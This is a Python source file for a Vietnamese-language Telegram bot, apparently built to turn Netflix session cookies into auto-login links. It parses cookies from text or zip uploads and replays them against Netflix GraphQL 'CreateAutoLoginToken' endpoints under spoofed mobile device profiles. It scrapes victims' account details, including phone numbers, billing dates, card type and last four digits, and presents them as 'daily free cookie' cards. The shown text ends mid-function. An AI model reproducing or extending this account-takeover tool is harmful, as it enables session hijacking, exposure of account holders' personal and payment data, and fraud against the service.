#!/usr/bin/env python3
"""
╔══════════════════════════════════════════╗
║   NETFLIX NFTOKEN PRO — PREMIUM BOT     ║
║   Cookie → NFToken Link Generator       ║
║   Multi-Endpoint | Auto-Fallback        ║
╚══════════════════════════════════════════╝
"""

import logging
import os
import requests
import json
import re
import zipfile
import io
import time
import asyncio
import random
from datetime import datetime
from typing import Dict, List, Tuple, Optional, Any
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
from urllib.parse import quote

# ══════════════════════════════════════════
#  CONFIGURATION
# ══════════════════════════════════════════
def load_bot_token() -> str:
    token = os.getenv('TELEGRAM_BOT_TOKEN', '').strip()
    if token:
        return token

    token_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'tokenbot.txt')
    try:
        with open(token_file, 'r', encoding='utf-8') as handle:
            for line in handle:
                value = line.strip()
                if value and not value.startswith('#'):
                    return value
    except OSError:
        pass
    return ''


TOKEN = load_bot_token()
MAX_FILE_SIZE = 20 * 1024 * 1024
MAX_BATCH_COOKIES = 100
MAX_ZIP_ENTRIES = 200
MAX_ZIP_UNCOMPRESSED_SIZE = 50 * 1024 * 1024
MAX_RETRIES = 3
RETRY_BACKOFF = 1
REQUEST_TIMEOUT = 30
BOT_VERSION = "3.0 PRO"
BOT_NAME = "NFToken Pro"

# ══════════════════════════════════════════
#  BRANDING & UI TEMPLATES
# ══════════════════════════════════════════

LOGO = "◆ 𝗡𝗙𝗧𝗼𝗸𝗲𝗻 𝗣𝗿𝗼"
DIVIDER = "━━━━━━━━━━━━━━━━━━━━━━"
DIVIDER_THIN = "─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─"
FOOTER = f"⚡ {BOT_NAME} v{BOT_VERSION}"

def banner_main(user_name: str = "bạn") -> str:
    return (
        f"◈━━━━━━━━━━━━━━━━━━━━━◈\n"
        f"   {LOGO}\n"
        f"   𝗡𝗲𝘁𝗳𝗹𝗶𝘅 𝗖𝗼𝗼𝗸𝗶𝗲 → 𝗡𝗙𝗧𝗼𝗸𝗲𝗻\n"
        f"◈━━━━━━━━━━━━━━━━━━━━━◈\n\n"
        f"  Xin chào, *{user_name}* 👋\n\n"
        f"  Chọn chức năng bên dưới:\n"
    )

def banner_result_success() -> str:
    return (
        f"◈━━━ ✅ 𝗧𝗛𝗔̀𝗡𝗛 𝗖𝗢̂𝗡𝗚 ━━━◈\n"
    )

def banner_result_fail() -> str:
    return (
        f"◈━━━ ❌ 𝗧𝗛𝗔̂́𝗧 𝗕𝗔̣𝗜 ━━━◈\n"
    )

def banner_batch_done(ok: int, total: int) -> str:
    pct = round(ok / total * 100) if total > 0 else 0
    bar_filled = round(pct / 10)
    bar_empty = 10 - bar_filled
    bar = "█" * bar_filled + "░" * bar_empty
    return (
        f"◈━━━ 📊 𝗞𝗘̂́𝗧 𝗤𝗨𝗔̉ ━━━◈\n\n"
        f"  {bar}  {pct}%\n\n"
        f"  ✅ Thành công:  *{ok}*\n"
        f"  ❌ Thất bại:      *{total - ok}*\n"
        f"  📁 Tổng cộng:   *{total}*\n\n"
        f"  {DIVIDER_THIN}\n"
        f"  {FOOTER}"
    )

def progress_bar(current: int, total: int, ok: int) -> str:
    pct = round(current / total * 100) if total > 0 else 0
    bar_filled = round(pct / 5)
    bar_empty = 20 - bar_filled
    bar = "▓" * bar_filled + "░" * bar_empty
    return (
        f"⏳ *Đang xử lý...*\n\n"
        f"  `[{bar}]` {pct}%\n\n"
        f"  📋 Tiến độ: *{current}* / *{total}*\n"
        f"  ✅ Hoạt động: *{ok}*"
    )

def format_account_card(account: dict, link: str, index: int = 0) -> str:
    def normalize_display(value):
        if isinstance(value, str):
            text = value.strip()
            # Decode Netflix \xXX and \uXXXX escapes
            if '\\x' in text or '\\u' in text:
                try:
                    text = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), text)
                    text = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), text)
                    # Fix surrogate pairs (emoji flags etc.)
                    text = text.encode('utf-16', 'surrogatepass').decode('utf-16')
                except Exception:
                    pass
            # Decode HTML entities: &uacute; → ú, &#x1EA1; → ạ
            import html as html_mod
            text = html_mod.unescape(text)
            if text.startswith('{') and text.endswith('}'):
                try:
                    import ast
                    obj = ast.literal_eval(text)
                    return normalize_display(obj)
                except Exception:
                    pass
            return text
        if isinstance(value, bool):
            return 'Có' if value else 'Không'
        if isinstance(value, (int, float)):
            return str(value)
        if isinstance(value, dict):
            for key in ['value', 'formattedPrice', 'displayValue', 'text', 'label', 'name', 'title', 'localizedName', 'price']:
                if key in value:
                    normalized = normalize_display(value[key])
                    if normalized:
                        return normalized
            if len(value) == 1:
                return normalize_display(next(iter(value.values())))
            items = [normalize_display(v) for v in value.values() if normalize_display(v)]
            return ', '.join(items) if items else 'N/A'
        if isinstance(value, list):
            items = [normalize_display(v) for v in value if normalize_display(v)]
            return ', '.join(items) if items else 'N/A'
        return 'N/A'

    account_name = normalize_display(account.get('account_name', 'N/A'))
    email_masked = normalize_display(account.get('email_masked', 'N/A'))
    phone = normalize_display(account.get('phone', 'N/A'))
    country = normalize_display(account.get('country', 'N/A'))
    currency = normalize_display(account.get('country_currency', ''))
    status = normalize_display(account.get('membership_status', 'N/A'))
    plan = normalize_display(account.get('plan', 'N/A'))
    plan_price = normalize_display(account.get('plan_price', 'N/A'))
    member_since = normalize_display(account.get('member_since', 'N/A'))
    next_billing = normalize_display(account.get('next_billing', 'N/A'))
    payment_method = normalize_display(account.get('payment_method', 'N/A'))
    cc_type = normalize_display(account.get('cc_type', 'N/A'))
    last4 = normalize_display(account.get('last4', 'N/A'))
    payment_on_hold = normalize_display(account.get('payment_on_hold', 'N/A'))
    video_quality = normalize_display(account.get('video_quality', 'N/A'))
    extra_member = normalize_display(account.get('extra_member', 'N/A'))
    profile_count = normalize_display(account.get('profile_count', 'N/A'))
    profiles = [normalize_display(p) for p in account.get('profiles', []) if normalize_display(p)]

    status_map = {
        'CURRENT_MEMBER': 'Đang hoạt động',
        'FORMER_MEMBER': 'Đã hết hạn',
        'ON HOLD': 'Tạm dừng',
    }
    status_vn = status_map.get(status, status)

    # Replace N/A with meaningful Vietnamese text
    if phone == 'N/A':
        phone = 'Chưa thiết lập'
    if cc_type == 'N/A' and payment_method != 'N/A':
        pm_lower = payment_method.lower()
        cc_type_map = {
            'cc': 'Credit Card', 'credit_card': 'Credit Card', 'creditcard': 'Credit Card',
            'dcb': 'Nhà mạng (DCB)',
            'paypal': 'PayPal',
            'gift': 'Gift Card', 'giftcard': 'Gift Card',
            'mobilewallet': 'Ví điện tử',
            'itunes': 'iTunes', 'applepay': 'Apple Pay',
            'googleplay': 'Google Play', 'googlepay': 'Google Pay',
        }
        cc_type = cc_type_map.get(pm_lower, payment_method)
    elif cc_type == 'N/A':
        cc_type = 'Không rõ'
    # Last 4: "Không có" for non-card payment types, "Ẩn" for cards
    non_card_types = ('mobilewallet', 'dcb', 'paypal', 'gift', 'giftcard',
                      'itunes', 'applepay', 'googleplay', 'googlepay')
    if last4 == 'N/A':
        if payment_method != 'N/A' and payment_method.lower() in non_card_types:
            last4 = 'Không có'
        else:
            last4 = 'Ẩn'
    if account_name == 'N/A':
        account_name = 'Không rõ'
    if email_masked == 'N/A':
        email_masked = 'Không rõ'

    profiles_str = ', '.join(profiles) if profiles else 'Không có'
    country_display = f"{country} ({currency})" if currency else country

    # Smart price display — avoid double currency (e.g. "C$ $23.99" → "$23.99")
    if plan_price != 'N/A':
        # Check if plan_price already contains a currency symbol or text
        has_currency = any(c in plan_price for c in '$€£¥₩฿₫₹₱₺₦₪') or \
                       any(plan_price.upper().startswith(p) for p in ['THB', 'VND', 'USD', 'EUR', 'GBP', 'ARS', 'CLP', 'COP', 'PEN', 'AED', 'SAR', 'R$', 'C$', 'A$', 'S$', 'HK$', 'NT$', 'RM', 'Rp'])
        if has_currency:
            price_display = plan_price
        elif currency:
            price_display = f"{currency} {plan_price}"
        else:
            price_display = plan_price
    else:
        price_display = 'Không rõ'

    return (
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"COOKIE MIỄN PHÍ (DAILY FREE) \n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"THÔNG TIN TÀI KHOẢN\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"├ Tên: {account_name}\n"
        f"├ Email: `{email_masked}`\n"
        f"├ Số điện thoại: `{phone}`\n"
        f"├ Quốc gia: {country_display}\n"
        f"└ Trạng thái: {status_vn}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"GÓI CƯỚC & THANH TOÁN\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"├ Gói cước: {plan}\n"
        f"├ Giá: {price_display}\n"
        f"├ Thành viên từ: {member_since}\n"
        f"├ Hóa đơn tiếp theo: {next_billing}\n"
        f"├ Phương thức TT: {payment_method}\n"
        f"├ Loại thẻ: {cc_type}\n"
        f"├ 4 số cuối: {last4}\n"
        f"└ Tạm giữ thanh toán: {payment_on_hold}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"CHI TIẾT DỊCH VỤ\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"├ Chất lượng video: {video_quality}\n"
        f"├ Extra Member: {extra_member}\n"
        f"├ Số Profile: {profile_count}\n"
        f"└ Profiles: {profiles_str}\n\n"
        f"🔗 [⚡ ĐĂNG NHẬP NFTOKEN ⚡]({link})\n\n"
        f"Nếu cookie bị lỗi, hãy bấm nút Báo lỗi bên dưới:"
    )

def format_batch_card(account: dict, link: str, index: int) -> str:
    # Use the same comprehensive format for batch checking
    return format_account_card(account, link, index)

# ══════════════════════════════════════════
#  LOGGING
# ══════════════════════════════════════════
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Store active tasks & user stats
active_tasks = {}
user_stats = {}  # {user_id: {'total': 0, 'success': 0}}

def get_user_stats(user_id: int) -> dict:
    if user_id not in user_stats:
        user_stats[user_id] = {'total': 0, 'success': 0}
    return user_stats[user_id]

def update_stats(user_id: int, total: int = 0, success: int = 0):
    stats = get_user_stats(user_id)
    stats['total'] += total
    stats['success'] += success

# ══════════════════════════════════════════
#  API ENDPOINTS & DEVICE PROFILES
# ══════════════════════════════════════════
API_ENDPOINTS = [
    'https://android.prod.ftl.netflix.com/graphql',
    'https://ios.prod.ftl.netflix.com/graphql',
    'https://android-appboot.netflix.com/graphql',
]

DEVICE_PROFILES = [
    {
        'user_agent': 'Mozilla/5.0 (Linux; Android 14; SM-S928B Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.122 Mobile Safari/537.36',
        'platform': 'android',
    },
    {
        'user_agent': 'Mozilla/5.0 (Linux; Android 13; Pixel 8 Pro Build/TQ3A.230901.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.165 Mobile Safari/537.36',
        'platform': 'android',
    },
    {
        'user_agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
        'platform': 'ios',
    },
    {
        'user_agent': 'Mozilla/5.0 (Linux; Android 14; SM-A546B Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.64 Mobile Safari/537.36',
        'platform': 'android',
    },
]

QUERY_CONFIGS = [
    {
        "operationName": "CreateAutoLoginToken",
        "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
        "extensions": {
            "persistedQuery": {
                "version": 102,
                "id": "76e97129-f4b5-41a0-a73c-12e674896849"
            }
        }
    },
    {
        "operationName": "CreateAutoLoginToken",
        "variables": {"scope": "WEBVIEW_MOBILE"},
        "extensions": {
            "persistedQuery": {
                "version": 102,
                "id": "76e97129-f4b5-41a0-a73c-12e674896849"
            }
        }
    },
    {
        "operationName": "CreateAutoLoginToken",
        "variables": {"scope": "NATIVE_MOBILE_STREAMING"},
        "extensions": {
            "persistedQuery": {
                "version": 102,
                "id": "76e97129-f4b5-41a0-a73c-12e674896849"
            }
        }
    },
]


# ══════════════════════════════════════════
#  PROXY MANAGER
# ══════════════════════════════════════════
# ══════════════════════════════════════════
#  NETFLIX TOKEN CHECKER
# ══════════════════════════════════════════
class NetflixTokenChecker:
    def __init__(self):
        self.session = self._create_session()
        self.last_working_endpoint = 0
        self.last_working_query = 0

    def _create_session(self):
        session = requests.Session()
        retry_strategy = Retry(
            total=MAX_RETRIES,
            backoff_factor=RETRY_BACKOFF,
            status_forcelist=[429, 500, 502, 503, 504, 408],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        return session

    def _get_headers(self, cookie_str: str) -> Dict[str, str]:
        profile = random.choice(DEVICE_PROFILES)
        return {
            'User-Agent': profile['user_agent'],
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/json',
            'Origin': 'https://www.netflix.com',
            'Referer': 'https://www.netflix.com/',
            'Cookie': cookie_str,
            'X-Netflix-Client-Type': 'mobile',
            'Connection': 'keep-alive',
        }

    def extract_cookies_from_text(self, text: str) -> List[Dict[str, str]]:
        if not isinstance(text, str) or not text.strip():
            return []

        cookies_list = []
        seen = set()

        def add_cookie(cookie: Dict[str, str]):
            netflix_id = cookie.get('NetflixId', '').strip()
            if not netflix_id:
                return
            cookie['NetflixId'] = netflix_id
            if cookie.get('SecureNetflixId'):
                cookie['SecureNetflixId'] = cookie['SecureNetflixId'].strip()
            key = (cookie.get('NetflixId', ''), cookie.get('SecureNetflixId', ''))
            if key not in seen:
                seen.add(key)
                cookies_list.append(cookie)

        for line in text.splitlines():
            line = line.strip()
            if not line or line.startswith('#'):
                continue

            # Netscape cookie format: domain, flag, path, secure, expiry, name, value.
            parts = line.split('\t')
            if len(parts) >= 7:
                name, value = parts[5].strip(), parts[6].strip()
                if name == 'NetflixId':
                    add_cookie({'NetflixId': value})
                elif name == 'SecureNetflixId':
                    # Merge the secure value with the matching cookie on this line set.
                    for cookie in reversed(cookies_list):
                        if not cookie.get('SecureNetflixId'):
                            cookie['SecureNetflixId'] = value
                            break
                continue

            netflix_match = re.search(r'(?<![A-Za-z])NetflixId=([^;\s&]+)', line)
            secure_match = re.search(r'(?<![A-Za-z])SecureNetflixId=([^;\s&]+)', line)
            if netflix_match:
                cookie = {'NetflixId': netflix_match.group(1)}
                if secure_match:
                    cookie['SecureNetflixId'] = secure_match.group(1)
                add_cookie(cookie)
                continue

            token_match = re.search(r'(?<![A-Za-z])(v%3D[^\s&;]+|ct%3D[^\s&;]+)', line)
            if token_match:
                add_cookie({'NetflixId': token_match.group(1)})

        return cookies_list

    def build_cookie_string(self, cookie_dict: Dict[str, str]) -> str:
        return '; '.join([f"{k}={v}" for k, v in cookie_dict.items()])

    def build_netscape_format(self, cookie_dict: Dict[str, str]) -> str:
        netscape = ["# Netscape HTTP Cookie File"]
        domain = ".netflix.com"
        path = "/"
        secure = "TRUE"
        expiry = "2147483647"
        for key, value in cookie_dict.items():
            netscape.append(f"{domain}\tTRUE\t{path}\t{secure}\t{expiry}\t{key}\t{value}")
        return "\n".join(netscape)

    def _mask_email(self, email: str) -> str:
        """Mask email: pan***@gmail.com"""
        if '@' not in email or email == 'N/A':
            return email
        local, domain = email.split('@', 1)
        if len(local) <= 3:
            masked = local[0] + '***'
        else:
            masked = local[:3] + '***'
        return f"{masked}@{domain}"

    def _get_country_currency(self, country_code: str) -> str:
        """Map country code or locale to currency symbol. Accepts 'VN' or 'en-VN'."""
        country_code = self._normalize_country_code(country_code)
        if not country_code:
            return ''
        currencies = {
            'US': '$', 'GB': '£', 'EU': '€', 'JP': '¥', 'KR': '₩',
            'TH': '฿', 'VN': '₫', 'IN': '₹', 'BR': 'R$', 'MX': '$',
            'CA': 'C$', 'AU': 'A$', 'DE': '€', 'FR': '€', 'IT': '€',
            'ES': '€', 'NL': '€', 'BE': '€', 'AT': '€', 'PT': '€',
            'PH': '₱', 'ID': 'Rp', 'MY': 'RM', 'SG': 'S$', 'TW': 'NT$',
            'HK': 'HK$', 'AR': 'ARS', 'CL': 'CLP', 'CO': 'COP',
            'PE': 'PEN', 'TR': '₺', 'PL': 'zł', 'SE': 'kr', 'NO': 'kr',
            'DK': 'kr', 'FI': '€', 'ZA': 'R', 'EG': 'E£', 'NG': '₦',
            'KE': 'KSh', 'SA': 'SAR', 'AE': 'AED', 'IL': '₪',
        }
        return currencies.get(country_code, '')

    def _normalize_country_code(self, raw: Any) -> str:
        """Return an ISO-3166 alpha-2 code from a code, locale, name, or Falcor object."""
        if raw is None:
            return ''

        if isinstance(raw, dict):
            # Netflix may return country as an object rather than a plain string.
            for key in ('countryCode', 'country_code', 'code', 'country',
                        'value', 'locale', 'region'):
                if key in raw:
                    code = self._normalize_country_code(raw[key])
                    if code:
                        return code
            return ''

        value = str(raw).strip()
        if not value:
            return ''

        names = {
            'united states': 'US', 'usa': 'US', 'united kingdom': 'GB',
            'united states of america': 'US', 'great britain': 'GB',
            'canada': 'CA', 'australia': 'AU',
            'vietnam': 'VN', 'viet nam': 'VN', 'thailand': 'TH',
            'japan': 'JP', 'south korea': 'KR', 'korea': 'KR',
            'india': 'IN', 'brazil': 'BR', 'mexico': 'MX',
            'philippines': 'PH', 'indonesia': 'ID', 'malaysia': 'MY',
            'singapore': 'SG', 'taiwan': 'TW', 'hong kong': 'HK',
            'germany': 'DE', 'france': 'FR', 'italy': 'IT',
            'spain': 'ES', 'netherlands': 'NL', 'belgium': 'BE',
            'austria': 'AT', 'portugal': 'PT', 'turkey': 'TR',
        }
        named = names.get(' '.join(value.casefold().split()))
        if named:
            return named

        known_codes = set('''AD AE AF AG AI AL AM AO AQ AR AS AT AU AW AX AZ
BA BB BD BE BF BG BH BI BJ BL BM BN BO BQ BR BS BT BV BW BY BZ
CA CC CD CF CG CH CI CK CL CM CN CO CR CU CV CW CX CY CZ
DE DJ DK DM DO DZ EC EE EG EH ER ES ET FI FJ FK FM FO FR GA GB GD GE GF GG GH GI GL GM GN GP GQ GR GS GT GU GW GY
HK HM HN HR HT HU ID IE IL IM IN IO IQ IR IS IT JE JM JO JP KE KG KH KI KM KN KP KR KW KY KZ
LA LB LC LI LK LR LS LT LU LV LY MA MC MD ME MF MG MH MK ML MM MN MO MP MQ MR MS MT MU MV MW MX MY MZ
NA NC NE NF NG NI NL NO NP NR NU NZ OM PA PE PF PG PH PK PL PM PN PR PS PT PW PY QA RE RO RS RU RW
SA SB SC SD SE SG SH SI SJ SK SL SM SN SO SR SS ST SV SX SY SZ
TC TD TF TG TH TJ TK TL TM TN TO TR TT TV TW TZ UA UG UM US UY UZ
VA VC VE VG VI VN VU WF WS YE YT ZA ZM ZW'''.split())

        if re.fullmatch(r'[A-Za-z]{2}', value):
            code = value.upper()
            return code if code in known_codes else ''

        # Handle locales such as en-VN, zh-Hant-TW, and en-US-u-hc.
        tokens = re.split(r'[-_@./\s]+', value)
        for token in reversed(tokens):
            code = token.upper()
            if code in known_codes:
                return code
        return ''

    def _format_timestamp(self, ts: str) -> str:
        """Convert numeric timestamp (seconds or milliseconds) to YYYY-MM-DD date string."""
        try:
            if not ts:
                return 'N/A'
            s = str(ts).strip()
            # If it's purely digits and long, interpret as ms
            if re.match(r'^\d{10,}$', s):
                # milliseconds
                num = int(s)
                if len(s) > 10:
                    dt = datetime.utcfromtimestamp(num / 1000)
                else:
                    dt = datetime.utcfromtimestamp(num)
                return dt.strftime('%Y-%m-%d')
            # Try ISO parse
            try:
                dt = datetime.fromisoformat(s)
                return dt.strftime('%Y-%m-%d')
            except Exception:
                pass
            # Last resort: return original
            return s
        except Exception:
            return ts

    # ── Netflix Data Extraction Helpers ──

    def _extract_build_id(self, html: str) -> Optional[str]:
        """Extract Netflix BUILD_IDENTIFIER from page HTML."""
        patterns = [
            r'"BUILD_IDENTIFIER"\s*:\s*"([^"]+)"',
            r'"buildIdentifier"\s*:\s*"([^"]+)"',
            r'"clientVersion"\s*:\s*"([^"]+)"',
            r'/api/shakti/([a-zA-Z0-9]+)/',
        ]
        for p in patterns:
            m = re.search(p, html)
            if m:
                return m.group(1)
        return None

    def _extract_auth_url(self, html: str) -> Optional[str]:
        """Extract authURL from Netflix page HTML for API calls."""
        m = re.search(r'"authURL"\s*:\s*"([^"]+)"', html)
        if m:
            val = m.group(1)
            val = re.sub(r'\\x([0-9a-fA-F]{2})', lambda mx: chr(int(mx.group(1), 16)), val)
            return val
        return None

    def _decode_netflix_json(self, raw: str) -> Optional[dict]:
        """Decode Netflix JSON that may contain \\x hex escapes."""
        try:
            cleaned = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), raw)
            return json.loads(cleaned)
        except Exception:
            pass
        try:
            return json.loads(raw)
        except Exception:
            pass
        return None

    def _parse_react_context(self, html: str) -> Optional[dict]:
        """Extract and parse reactContext / embedded JSON from Netflix HTML."""
        patterns = [
            r'netflix\.reactContext\s*=\s*({.+?});\s*</script>',
            r'reactContext\s*=\s*({.+?});\s*</script>',
            r'netflix\.falcorCache\s*=\s*({.+?});\s*</script>',
            r'window\.__NEXT_DATA__\s*=\s*({.+?});\s*</script>',
        ]
        for pat in patterns:
            m = re.search(pat, html, re.DOTALL)
            if m:
                result = self._decode_netflix_json(m.group(1))
                if result:
                    return result
        return None

    def _unwrap_falcor(self, val: Any) -> Any:
        """Unwrap Netflix Falcor atom values: {$type:'atom', value:'X'} → 'X'"""
        if isinstance(val, dict):
            if '$type' in val and 'value' in val:
                return val['value']
            if 'value' in val and len(val) <= 3:
                return val['value']
        return val

    def _deep_find(self, data: Any, keys: list, max_depth: int = 20) -> dict:
        """Recursively search nested data for multiple keys at once. Returns {key: value}."""
        results = {}
        remaining = [k for k in keys if k not in results]
        if not remaining or max_depth <= 0:
            return results

        if isinstance(data, dict):
            for k, v in data.items():
                # Unwrap Falcor atoms: {$type:'atom', value:'X'} → 'X'
                uv = self._unwrap_falcor(v)
                for target in remaining:
                    if target not in results and k == target:
                        if isinstance(uv, (str, int, float)):
                            results[target] = str(uv)
                        elif isinstance(uv, bool):
                            results[target] = uv
                        elif isinstance(uv, dict):
                            for vk in ['value', 'formattedPrice', 'displayValue', 'text',
                                        'label', 'name', 'localizedName', 'price']:
                                if vk in uv and isinstance(uv[vk], (str, int, float)):
                                    results[target] = str(uv[vk])
                                    break
                            else:
                                results[target] = uv
                        elif isinstance(uv, list):
                            results[target] = uv
                remaining = [k for k in keys if k not in results]
                if not remaining:
                    break
                sub = self._deep_find(v, remaining, max_depth - 1)
                results.update(sub)
                remaining = [k for k in keys if k not in results]
        elif isinstance(data, list):
            for item in data:
                remaining = [k for k in keys if k not in results]
                if not remaining:
                    break
                sub = self._deep_find(item, remaining, max_depth - 1)
                results.update(sub)

        return results

    def _parse_account_from_context(self, ctx: dict, info: dict):
        """Parse account info from reactContext or any Netflix JSON structure."""
        if not ctx:
            return

        # ── First: try known Netflix reactContext paths directly ──
        models = ctx.get('models', {})
        if isinstance(models, dict):
            for model_name, model_data in models.items():
                inner = model_data.get('data', model_data) if isinstance(model_data, dict) else model_data
                if isinstance(inner, dict):
                    # Direct field extraction from known model structures
                    for field, targets in [
                        ('emailAddress', 'email'), ('email', 'email'),
                        ('firstName', 'account_name'), ('displayName', 'account_name'),
                        ('phoneNumber', 'phone'), ('contactPhoneNumber', 'phone'),
                        ('formattedPhoneNumber', 'phone'),
                        ('membershipStatus', 'membership_status'),
                        ('countryOfSignup', 'country'), ('currentCountry', 'country'),
                        ('localizedPlanName', 'plan'), ('planName', 'plan'),
                        ('formattedPrice', 'plan_price'), ('retailPrice', 'plan_price'),
                        ('planPrice', 'plan_price'),
                        ('memberSince', 'member_since'),
                        ('nextBillingDate', 'next_billing'),
                        ('mopName', 'cc_type'), ('cardBrand', 'cc_type'),
                        ('cardType', 'cc_type'), ('cardIssuer', 'cc_type'),
                        ('mopDisplayName', 'cc_type'),
                        ('lastFourDigits', 'last4'), ('cardLastFourDigits', 'last4'),
                        ('mopLastFour', 'last4'), ('last4Digits', 'last4'),
                        ('paymentType', 'payment_method'), ('mopType', 'payment_method'),
                        ('paymentMethodType', 'payment_method'),
                        ('videoQuality', 'video_quality'), ('planVideoQuality', 'video_quality'),
                        ('maxStreams', 'max_streams'),
                        ('extraMemberSlots', 'extra_member_slots'),
                    ]:
                        if field in inner and info.get(targets, 'N/A') == 'N/A':
                            raw_val = self._unwrap_falcor(inner[field])
                            if raw_val and (isinstance(raw_val, (str, int, float)) or
                                             (targets == 'country' and isinstance(raw_val, dict))):
                                val = str(raw_val)
                                if targets == 'email' and '@' not in val:
                                    continue
                                if targets == 'country':
                                    # Normalize locale: "en-CA" → "CA", "en_VN" → "VN"
                                    val = self._normalize_country_code(raw_val)
                                    if not val:
                                        continue
                                    info['country_currency'] = self._get_country_currency(val)
                                if targets == 'member_since':
                                    val = self._format_timestamp(val)
                                if targets == 'next_billing':
                                    val = self._format_timestamp(val)
                                if targets == 'email':
                                    info['email_masked'] = self._mask_email(val)
                                info[targets] = val

        # ── Then: recursive deep search for anything still missing ──
        search_keys = [
            'membershipStatus', 'countryOfSignup', 'currentCountry', 'signupCountry',
            'emailAddress', 'email', 'firstName', 'displayName', 'accountName',
            'phoneNumber', 'phone', 'mobileNumber', 'contactPhoneNumber',
            'formattedPhoneNumber', 'telephoneNumber',
            'localizedPlanName', 'planName', 'currentPlan', 'planDisplayName',
            'formattedPrice', 'planPrice', 'retailPrice', 'monthlyPrice',
            'currentPlanPrice', 'priceFormatted', 'formattedAmount',
            'memberSince', 'membershipStartDate', 'createdDate', 'startDate',
            'accountCreationDate', 'signupDate',
            'nextBillingDate', 'nextRenewalDate', 'renewalDate', 'nextPaymentDate',
            'paymentType', 'paymentMethod', 'mopType', 'paymentMethodType', 'billingType',
            'cardType', 'cardIssuer', 'issuer', 'cardBrand', 'mopName',
            'mopDisplayName', 'cardNetwork', 'paymentMethodLogo',
            'lastFourDigits', 'last4', 'accountLast4', 'cardLastFourDigits',
            'mopLastFour', 'lastDigits', 'last4Digits',
            'maxStreams', 'numOfDevices', 'concurrentStreams',
            'videoQuality', 'planVideoQuality', 'maxResolution',
            'extraMemberSlots', 'extraMembers',
            'profiles', 'allProfiles',
            'locale', 'preferredLocale', 'userLocale',
            'isOnHold', 'paymentOnHold', 'onHold',
        ]

        found = self._deep_find(ctx, search_keys)

        # ── Email ──
        for key in ['emailAddress', 'email']:
            val = found.get(key)
            if val and isinstance(val, str) and '@' in val and info['email'] == 'N/A':
                info['email'] = val
                info['email_masked'] = self._mask_email(val)
                break

        # ── Account name ──
        for key in ['firstName', 'displayName', 'accountName']:
            val = found.get(key)
            if val and isinstance(val, str) and info['account_name'] == 'N/A':
                info['account_name'] = val
                break

        # ── Phone ──
        for key in ['phoneNumber', 'phone', 'mobileNumber', 'contactPhoneNumber',
                    'formattedPhoneNumber', 'telephoneNumber']:
            val = found.get(key)
            if val and isinstance(val, str) and info['phone'] == 'N/A':
                info['phone'] = val
                break

        # ── Country ──
        for key in ['countryOfSignup', 'currentCountry', 'signupCountry']:
            val = self._normalize_country_code(found.get(key))
            if val and info['country'] == 'N/A':
                # Normalize locale: "en-CA" → "CA", "en_VN" → "VN"
                info['country'] = val
                info['country_currency'] = self._get_country_currency(val)
                break
        if info['country'] == 'N/A':
            for key in ['locale', 'preferredLocale', 'userLocale']:
                cc = self._normalize_country_code(found.get(key))
                if cc:
                    info['country'] = cc
                    info['country_currency'] = self._get_country_currency(cc)
                    break

        # ── Membership status ──
        val = found.get('membershipStatus')
        if val and isinstance(val, str) and info['membership_status'] == 'N/A':
            info['membership_status'] = val

        # ── Plan ──
        for key in ['localizedPlanName', 'planName', 'currentPlan']:
            val = found.get(key)
            if val and isinstance(val, str) and info['plan'] == 'N/A':
                info['plan'] = val
                break

        # ── Plan price ──
        for key in ['formattedPrice', 'planPrice', 'retailPrice', 'monthlyPrice',
                    'currentPlanPrice', 'priceFormatted', 'formattedAmount']:
            val = found.get(key)
            if val and info['plan_price'] == 'N/A':
                info['plan_price'] = str(val)
                break

        # ── Member since ──
        for key in ['memberSince', 'membershipStartDate', 'createdDate', 'startDate']:
            val = found.get(key)
            if val and info['member_since'] == 'N/A':
                info['member_since'] = self._format_timestamp(str(val))
                break

        # ── Next billing ──
        for key in ['nextBillingDate', 'nextRenewalDate', 'renewalDate']:
            val = found.get(key)
            if val and info['next_billing'] == 'N/A':
                info['next_billing'] = self._format_timestamp(str(val))
                break

        # ── Payment method ──
        for key in ['paymentType', 'paymentMethod', 'mopType']:
            val = found.get(key)
            if val and isinstance(val, str) and info['payment_method'] == 'N/A':
                info['payment_method'] = val
                break

        # ── Card type ──
        for key in ['cardType', 'cardIssuer', 'issuer', 'cardBrand', 'mopName',
                    'mopDisplayName', 'cardNetwork', 'paymentMethodLogo']:
            val = found.get(key)
            if val and isinstance(val, str) and info['cc_type'] == 'N/A':
                info['cc_type'] = val
                break

        # ── Last 4 digits ──
        for key in ['lastFourDigits', 'last4', 'accountLast4', 'cardLastFourDigits',
                    'mopLastFour', 'lastDigits', 'last4Digits']:
            val = found.get(key)
            if val and info['last4'] == 'N/A':
                info['last4'] = str(val)
                break

        # ── Video quality ──
        for key in ['videoQuality', 'planVideoQuality', 'maxResolution']:
            val = found.get(key)
